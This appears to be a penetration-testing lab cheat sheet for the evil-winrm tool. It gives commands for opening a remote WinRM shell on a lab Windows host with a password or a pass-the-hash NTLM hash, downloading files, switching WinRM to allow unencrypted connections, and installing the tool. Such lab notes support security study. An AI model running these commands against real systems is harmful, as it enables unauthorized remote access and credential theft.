tags: #powershell #evilwinrm #winrm 


# Connect

SImple HTTP Shell
```bash
./evil-winrm.rb -i 10.10.233.109 -u thmuser1 -p Password321
```

Pass-the-hash
```bash
./evil-winrm.rb -i 10.10.233.109 -u thmuser1 -H <2nd half of the dumped hashes>
```

```bash
./evil-winrm.rb -i 10.10.233.109 -u administrator -H f3118544a831e728781d780cfdb9c1fa
```
# Execution

To download a file...
```winrm
download <file>
```

# Evaluate the winrm configuration

References: https://www.dhruvsahni.com/verifying-winrm-connectivity

Look at the configuration of the listener
```cmd
winrm enumerate winrm/config/listener
```

Look at the configuration of the service
```cmd
winrm get winrm/config/service
```

Change the winrm configuration to allow an unencrypted connection
```cmd
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
```


# Powershell connection with WinRM

```pwsh

```


# Installation

See https://github.com/HAckplayers/evil-winrm

```cmd
sudo gem install winrm winrm-fs stringio logger fileutils
```

```cmd
git clone https://github.com/Hackplayers/evil-winrm.git
```

This installs evil-winrm in /work/github/evil-winrm

